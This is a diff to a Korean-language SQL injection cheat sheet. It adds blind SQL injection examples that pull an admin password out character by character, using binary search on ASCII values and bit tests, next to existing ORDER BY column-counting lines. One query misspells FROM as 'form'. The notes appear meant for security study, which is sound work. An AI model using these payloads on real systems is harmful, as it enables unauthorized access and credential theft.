@@ -86,5 +86,13 @@ select * from users order by 2; # ok
 select * from users order by 3; # error -> users 테이블의 컬럼 개수는 2개인 것   
 <hr>
 
+### Blind SQL Injection
+Binary Search   
+select * from users where username='admin' and ascii(substr(password,1,1))>79;
+Bit 연산   
+select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;   
+select * form users where username='admin' and substr(bin(ord(password)),2,1)=1;   
+<hr>
+
 ### Filter Bypass
 [Filter Bypass](https://github.com/zzsla/security/blob/main/cheat_sheet/SQL%20injection/Filter%20Bypass.md)
